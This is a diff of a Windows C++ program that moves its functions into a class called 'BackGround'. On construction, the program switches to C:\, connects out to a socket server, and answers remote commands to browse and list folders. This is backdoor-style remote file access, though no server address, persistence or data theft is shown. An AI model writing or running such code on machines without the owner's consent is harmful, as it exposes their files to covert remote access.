@@ -12,9 +12,27 @@
 #pragma comment(lib, "WS2_32.lib")
 using namespace std;
 
+class BackGround {
+    SOCKET server;
+public:
+    BackGround() {
+        SetCurrentDirectory(string_to_LPCWSTR("C:\\"));
+        SocketSetting();
+    }
+    bool isFolder(string name);
+    LPCWSTR string_to_LPCWSTR(string str);
+    void SearchFileInDirectory(const std::string& searchDirectory);
+    string showDirectoryContents();
+    string open_folder(string& path, string name);
+    void recieve();
+    void SocketSetting();
+
+
+};
+
 SOCKET server;
 
-bool isFolder(string name) {
+bool BackGround::isFolder(string name) {
     filesystem::path currentDir = filesystem::current_path();
     string temp = "";
     vector<string> vectr;
@@ -32,7 +50,7 @@ bool isFolder(string name) {
     return false;
 }
 
-LPCWSTR string_to_LPCWSTR(string str)
+LPCWSTR BackGround::string_to_LPCWSTR(string str)
 {
     int bufferSize = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, nullptr, 0);
     wchar_t* buffer = new wchar_t[bufferSize];
@@ -41,7 +59,7 @@ LPCWSTR string_to_LPCWSTR(string str)
     delete[] buffer;
 }
 
-void SearchFileInDirectory(const std::string& searchDirectory) {
+void BackGround::SearchFileInDirectory(const std::string& searchDirectory) {
     try {
         for (const auto& entry : filesystem::directory_iterator(searchDirectory)) {
             if (entry.is_regular_file()) {
@@ -84,7 +102,7 @@ void SearchFileInDirectory(const std::string& searchDirectory) {
     }
 }
 
-string showDirectoryContents()
+string BackGround::showDirectoryContents()
 {
     filesystem::path currentDir = filesystem::current_path();
     string temp = "";
@@ -95,7 +113,7 @@ string showDirectoryContents()
     return temp;
 }
 
-string open_folder(string& path, string name) {
+string BackGround::open_folder(string& path, string name) {
     if (isFolder(name)) {
         path += ("\\" + name);
         int result = SetCurrentDirectory(string_to_LPCWSTR(path));
@@ -105,7 +123,7 @@ string open_folder(string& path, string name) {
     return path;
 }
 
-void recieve() {
+void BackGround::recieve() {
     string path = "C:";
     char buffer[256];
     while (true) {
@@ -119,7 +137,7 @@ void recieve() {
     }
 }
 
-void SocketSetting() {
+void BackGround::SocketSetting() {
     WSADATA WSAData;
     SOCKADDR_IN addr;
     WSAStartup(MAKEWORD(2, 0), &WSAData);
@@ -143,7 +161,7 @@ void SocketSetting() {
 
     send(server, temp.c_str(), temp.size(), NULL);
 
-    thread th(recieve);
+    thread th(&BackGround::recieve, this); // передача указателя на объект
 
     th.join();
 }
@@ -151,9 +169,8 @@ void SocketSetting() {
 int main()
 {
     setlocale(LC_ALL, "rus");
-    SetCurrentDirectory(string_to_LPCWSTR("C:\\"));
-    SocketSetting();
 
+    BackGround a = BackGround();
 
 
 }
